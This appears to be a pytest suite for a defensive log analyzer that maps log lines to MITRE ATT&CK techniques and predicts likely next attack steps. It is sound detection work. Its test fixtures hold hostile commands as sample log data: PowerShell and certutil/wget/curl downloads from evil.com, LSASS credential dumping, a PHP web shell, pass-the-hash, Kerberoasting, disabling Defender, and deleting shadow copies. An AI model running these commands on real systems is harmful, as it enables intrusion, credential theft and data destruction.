"""
PredictiveAttackPath — Test Suite

Tests the full analysis pipeline:
  1. Regex pattern matching
  2. Graph construction (offline, with mock data)
  3. Prediction scoring
  4. Attribution matching
  5. API endpoint (integration test)

Run:  cd backend && python -m pytest test_engine.py -v
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

# ── Ensure backend is importable ──────────────────────────────────
sys.path.insert(0, str(Path(__file__).resolve().parent))

from log_analyzer import LogAnalyzer
from regex_patterns import (
    TECHNIQUE_PATTERNS,
    get_pattern_count,
    get_tactic_coverage,
    get_total_regex_count,
)


# ═══════════════════════════════════════════════════════════════════
#  Test 1: Regex Pattern Library Validation
# ═══════════════════════════════════════════════════════════════════


class TestRegexPatterns:
    """Validate the pattern library meets coverage requirements."""

    def test_minimum_technique_coverage(self):
        """Must have patterns for at least 200 technique IDs."""
        count = get_pattern_count()
        assert count >= 200, f"Only {count} techniques — need ≥200"

    def test_total_regex_count(self):
        """Must have at least 500 individual regex patterns."""
        count = get_total_regex_count()
        assert count >= 500, f"Only {count} regexes — need ≥500"

    def test_all_14_tactics_covered(self):
        """Every MITRE tactic must have at least one technique pattern."""
        expected_tactics = {
            "reconnaissance", "resource-development", "initial-access",
            "execution", "persistence", "privilege-escalation",
            "defense-evasion", "credential-access", "discovery",
            "lateral-movement", "collection", "command-and-control",
            "exfiltration", "impact",
        }
        coverage = get_tactic_coverage()
        covered = set(coverage.keys())
        missing = expected_tactics - covered
        assert not missing, f"Missing tactics: {missing}"

    def test_pattern_structure(self):
        """Every entry must have required fields."""
        for tid, entry in TECHNIQUE_PATTERNS.items():
            assert "name" in entry, f"{tid} missing 'name'"
            assert "tactic" in entry, f"{tid} missing 'tactic'"
            assert "patterns" in entry, f"{tid} missing 'patterns'"
            assert "confidence" in entry, f"{tid} missing 'confidence'"
            assert len(entry["patterns"]) >= 1, f"{tid} has no patterns"
            assert 0.0 < entry["confidence"] <= 1.0, f"{tid} bad confidence"

    def test_technique_id_format(self):
        """All technique IDs must match T####[.###] format."""
        import re
        pattern = re.compile(r"^T\d{4}(\.\d{3})?$")
        for tid in TECHNIQUE_PATTERNS:
            assert pattern.match(tid), f"Bad technique ID format: {tid}"


# ═══════════════════════════════════════════════════════════════════
#  Test 2: Log Analyzer — Detection
# ═══════════════════════════════════════════════════════════════════


class TestLogAnalyzer:
    """Test the regex-based log scanning engine."""

    @pytest.fixture
    def analyzer(self):
        return LogAnalyzer()

    def test_detect_powershell(self, analyzer):
        """Must detect T1059.001 from PowerShell indicators."""
        log = """
        [2025-06-15T08:23:48Z] powershell.exe -enc SQBFAFgA -ep bypass -windowstyle hidden
        [2025-06-15T08:23:49Z] IEX (New-Object Net.WebClient).DownloadString('https://evil.com/p')
        """
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1059.001" in tech_ids, f"PowerShell not detected. Found: {tech_ids}"

    def test_detect_scheduled_task(self, analyzer):
        """Must detect T1053.005 from schtasks."""
        log = 'schtasks /create /tn "UpdateCheck" /tr "powershell.exe" /sc DAILY'
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1053.005" in tech_ids, f"Scheduled Task not detected. Found: {tech_ids}"

    def test_detect_registry_run_key(self, analyzer):
        """Must detect T1547.001 from Run key modification."""
        log = r'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "malware.exe"'
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1547.001" in tech_ids, f"Registry Run Key not detected. Found: {tech_ids}"

    def test_detect_credential_dump(self, analyzer):
        """Must detect T1003.001 from LSASS dumping."""
        log = """
        sekurlsa::logonpasswords
        rundll32.exe comsvcs.dll MiniDump lsass.exe
        """
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1003.001" in tech_ids, f"LSASS dump not detected. Found: {tech_ids}"

    def test_detect_webshell(self, analyzer):
        """Must detect T1505.003 from web shell indicators."""
        log = "eval($_POST['cmd']); webshell detected on /uploads/.status.php"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1505.003" in tech_ids, f"Web Shell not detected. Found: {tech_ids}"

    def test_detect_kerberoasting(self, analyzer):
        """Must detect T1558.003 from Kerberoasting."""
        log = "Invoke-Kerberoast -OutputFormat hashcat | hashcat -m 13100"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1558.003" in tech_ids, f"Kerberoasting not detected. Found: {tech_ids}"

    def test_detect_event_log_clearing(self, analyzer):
        """Must detect T1070.001 from wevtutil cl."""
        log = """
        wevtutil cl Security
        wevtutil cl System
        """
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1070.001" in tech_ids, f"Event log clear not detected. Found: {tech_ids}"

    def test_detect_pass_the_hash(self, analyzer):
        """Must detect T1550.002 from Pass the Hash."""
        log = "impacket-wmiexec -hashes aad3b435:31d6cfe0 admin@10.0.0.5"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1550.002" in tech_ids, f"Pass the Hash not detected. Found: {tech_ids}"

    def test_detect_ingress_tool_transfer(self, analyzer):
        """Must detect T1105 from certutil/wget download."""
        log = """
        certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\p.exe
        wget http://evil.com/stage2 -O /tmp/s2
        curl http://evil.com/implant -o /tmp/.hidden
        """
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1105" in tech_ids, f"Tool transfer not detected. Found: {tech_ids}"

    def test_detect_disable_defender(self, analyzer):
        """Must detect T1562.001 from Defender disablement."""
        log = "Set-MpPreference -DisableRealtimeMonitoring $true"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1562.001" in tech_ids, f"Defender disable not detected. Found: {tech_ids}"

    def test_detect_uac_bypass(self, analyzer):
        """Must detect T1548.002 from UAC bypass methods."""
        log = "fodhelper.exe uac bypass via HKCU\\ms-settings"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1548.002" in tech_ids, f"UAC bypass not detected. Found: {tech_ids}"

    def test_detect_ransomware(self, analyzer):
        """Must detect T1486 from ransomware indicators."""
        log = """
        All your files have been encrypted. ransomware detected.
        Send bitcoin to wallet xyz to decrypt key payment.
        """
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1486" in tech_ids, f"Ransomware not detected. Found: {tech_ids}"

    def test_detect_dns_tunneling(self, analyzer):
        """Must detect T1071.004 from DNS C2."""
        log = "dns tunnel detected: dnscat connection to c2.evil.com"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1071.004" in tech_ids, f"DNS tunneling not detected. Found: {tech_ids}"

    def test_detect_shadow_copy_deletion(self, analyzer):
        """Must detect T1490 from VSS shadow deletion."""
        log = "vssadmin delete shadows /all /quiet"
        results = analyzer.analyze(log)
        tech_ids = {d.technique_id for d in results}
        assert "T1490" in tech_ids, f"Shadow copy delete not detected. Found: {tech_ids}"

    def test_confidence_boost_multiple_patterns(self, analyzer):
        """Confidence should increase with multiple pattern matches."""
        # Single indicator
        log_single = "powershell.exe -enc ABC123"
        # Multiple indicators
        log_multi = """
        powershell.exe -enc ABC123 -ep bypass -windowstyle hidden
        Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')
        IEX (iwr http://evil.com/payload)
        """
        r_single = analyzer.analyze(log_single)
        r_multi = analyzer.analyze(log_multi)

        conf_single = next(
            (d.confidence for d in r_single if d.technique_id == "T1059.001"), 0
        )
        conf_multi = next(
            (d.confidence for d in r_multi if d.technique_id == "T1059.001"), 0
        )
        assert conf_multi >= conf_single, (
            f"Multi-pattern confidence ({conf_multi}) should be ≥ "
            f"single ({conf_single})"
        )

    def test_empty_log_returns_nothing(self, analyzer):
        """Empty log should return no detections."""
        results = analyzer.analyze("")
        assert len(results) == 0

    def test_benign_log_minimal_detections(self, analyzer):
        """Normal system log should produce few or no detections."""
        log = """
        [INFO] Application started successfully on port 8080
        [INFO] Database connection pool initialized (10 connections)
        [INFO] User john.doe logged in from 192.168.1.100
        [INFO] API request GET /api/users completed in 45ms
        [INFO] Scheduled backup completed successfully
        """
        results = analyzer.analyze(log)
        # Should have very few false positives
        assert len(results) <= 3, f"Too many FPs in benign log: {len(results)}"


# ═══════════════════════════════════════════════════════════════════
#  Test 3: Full APT29 Simulation Log
# ═══════════════════════════════════════════════════════════════════


class TestAPT29Simulation:
    """Test detection against the APT29 simulation log."""

    @pytest.fixture
    def analyzer(self):
        return LogAnalyzer()

    @pytest.fixture
    def apt29_log(self):
        log_path = Path(__file__).resolve().parent.parent / "test_logs" / "apt29_simulation.log"
        if not log_path.exists():
            pytest.skip("APT29 test log not found")
        return log_path.read_text(encoding="utf-8")

    def test_detects_multiple_techniques(self, analyzer, apt29_log):
        """APT29 log should trigger at least 8 distinct techniques."""
        results = analyzer.analyze(apt29_log)
        assert len(results) >= 8, (
            f"Only {len(results)} techniques detected — expected ≥8"
        )

    def test_detects_key_apt29_techniques(self, analyzer, apt29_log):
        """Must detect the core techniques in the APT29 scenario."""
        results = analyzer.analyze(apt29_log)
        detected = {d.technique_id for d in results}

        expected_subset = {
            "T1059.001",  # PowerShell
            "T1053.005",  # Scheduled Task
            "T1547.001",  # Registry Run Keys
            "T1003.001",  # LSASS Memory
            "T1070.001",  # Clear Event Logs
        }
        missing = expected_subset - detected
        assert not missing, f"Missing key techniques: {missing}. Detected: {detected}"

    def test_covers_multiple_tactics(self, analyzer, apt29_log):
        """Detected techniques should span at least 4 tactics."""
        results = analyzer.analyze(apt29_log)
        tactics = {d.tactic for d in results}
        assert len(tactics) >= 4, f"Only {len(tactics)} tactics: {tactics}"


# ═══════════════════════════════════════════════════════════════════
#  Test 4: Multi-Stage Attack Log
# ═══════════════════════════════════════════════════════════════════


class TestMultiStageLog:
    """Test the complex multi-stage attack scenario."""

    @pytest.fixture
    def analyzer(self):
        return LogAnalyzer()

    @pytest.fixture
    def multi_log(self):
        log_path = Path(__file__).resolve().parent.parent / "test_logs" / "multi_stage_attack.log"
        if not log_path.exists():
            pytest.skip("Multi-stage test log not found")
        return log_path.read_text(encoding="utf-8")

    def test_detects_supply_chain(self, analyzer, multi_log):
        """Must detect supply chain indicators."""
        results = analyzer.analyze(multi_log)
        detected = {d.technique_id for d in results}
        supply_chain = {"T1195", "T1195.001"}
        assert detected & supply_chain, (
            f"No supply chain detection. Found: {detected}"
        )

    def test_detects_cloud_techniques(self, analyzer, multi_log):
        """Must detect cloud-specific techniques."""
        results = analyzer.analyze(multi_log)
        detected = {d.technique_id for d in results}
        cloud = {"T1552.005", "T1098.001", "T1580", "T1562.008"}
        overlap = detected & cloud
        assert len(overlap) >= 1, (
            f"No cloud techniques detected. Found: {detected}"
        )

    def test_detects_container_discovery(self, analyzer, multi_log):
        """Must detect container/K8s discovery."""
        results = analyzer.analyze(multi_log)
        detected = {d.technique_id for d in results}
        assert "T1613" in detected, f"Container discovery not found. Detected: {detected}"


# ═══════════════════════════════════════════════════════════════════
#  Test 5: Graph Construction (with Mock Data)
# ═══════════════════════════════════════════════════════════════════


class TestTechniqueGraph:
    """Test graph building and prediction with mock MITRE data."""

    @pytest.fixture
    def mock_dataset(self):
        """Create a minimal mock dataset for testing."""
        from mitre_data_loader import IntrusionSet, MitreDataset, Technique

        ds = MitreDataset()

        # Create 10 techniques
        for i in range(1, 11):
            tid = f"T100{i}" if i < 10 else "T1010"
            ds.techniques[tid] = Technique(
                technique_id=tid,
                stix_id=f"attack-pattern--{i:04d}",
                name=f"Technique {i}",
                tactics=["execution"] if i <= 5 else ["persistence"],
            )

        # Create 3 groups with overlapping technique usage
        ds.groups["G0001"] = IntrusionSet(
            group_id="G0001", stix_id="is--0001",
            name="GroupAlpha", aliases=["Alpha"],
            technique_ids=["T1001", "T1002", "T1003", "T1006"],
        )
        ds.groups["G0002"] = IntrusionSet(
            group_id="G0002", stix_id="is--0002",
            name="GroupBeta", aliases=["Beta"],
            technique_ids=["T1002", "T1003", "T1004", "T1007"],
        )
        ds.groups["G0003"] = IntrusionSet(
            group_id="G0003", stix_id="is--0003",
            name="GroupGamma", aliases=["Gamma"],
            technique_ids=["T1003", "T1004", "T1005", "T1008"],
        )

        return ds

    def test_graph_has_correct_nodes(self, mock_dataset):
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)
        assert graph.graph.number_of_nodes() == 10

    def test_graph_has_edges(self, mock_dataset):
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)
        assert graph.graph.number_of_edges() > 0

    def test_edge_weight_for_shared_techniques(self, mock_dataset):
        """T1002-T1003 shared by G0001+G0002 → weight=2.
           T1003-T1004 shared by G0002+G0003 → weight=2."""
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)

        assert graph.graph.has_edge("T1002", "T1003")
        w = graph.graph["T1002"]["T1003"]["weight"]
        assert w == 2, f"Expected weight 2, got {w}"

    def test_prediction_returns_results(self, mock_dataset):
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)

        predictions, attributions, path = graph.predict_next_techniques(
            detected_ids=["T1001", "T1002"]
        )
        assert len(predictions) > 0, "No predictions returned"

    def test_prediction_excludes_detected(self, mock_dataset):
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)

        predictions, _, _ = graph.predict_next_techniques(
            detected_ids=["T1001", "T1002"]
        )
        predicted_ids = {p.technique_id for p in predictions}
        assert "T1001" not in predicted_ids, "Detected T1001 should not be predicted"
        assert "T1002" not in predicted_ids, "Detected T1002 should not be predicted"

    def test_attribution_returns_groups(self, mock_dataset):
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)

        _, attributions, _ = graph.predict_next_techniques(
            detected_ids=["T1001", "T1002", "T1003"]
        )
        assert len(attributions) > 0, "No attribution matches"
        # G0001 uses all 3 detected → should score highest
        assert attributions[0].group_name == "GroupAlpha"

    def test_attribution_boost_increases_score(self, mock_dataset):
        from technique_graph import TechniqueGraph
        graph = TechniqueGraph(mock_dataset)

        # Without boost
        preds_no_boost, _, _ = graph.predict_next_techniques(
            detected_ids=["T1001", "T1002", "T1003"],
            enable_attribution_boost=False,
        )
        # With boost
        preds_boosted, _, _ = graph.predict_next_techniques(
            detected_ids=["T1001", "T1002", "T1003"],
            enable_attribution_boost=True,
        )

        # T1006 is in G0001 and should be boosted
        score_no = next(
            (p.probability for p in preds_no_boost if p.technique_id == "T1006"), 0
        )
        score_yes = next(
            (p.probability for p in preds_boosted if p.technique_id == "T1006"), 0
        )
        # Boosted score should be ≥ non-boosted (or equal if already max)
        assert score_yes >= score_no


# ═══════════════════════════════════════════════════════════════════
#  Test 6: Pattern Coverage Report (not a test, generates stats)
# ═══════════════════════════════════════════════════════════════════


def test_print_coverage_report():
    """Print pattern coverage statistics (always passes)."""
    coverage = get_tactic_coverage()
    total_techs = get_pattern_count()
    total_regex = get_total_regex_count()

    print("\n" + "=" * 60)
    print("  PATTERN COVERAGE REPORT")
    print("=" * 60)
    print(f"  Total technique IDs covered:  {total_techs}")
    print(f"  Total individual regexes:     {total_regex}")
    print(f"  Average regexes per technique: {total_regex / max(total_techs, 1):.1f}")
    print("-" * 60)
    for tactic, count in sorted(coverage.items()):
        bar = "█" * count
        print(f"  {tactic:30s} {count:4d}  {bar}")
    print("=" * 60)
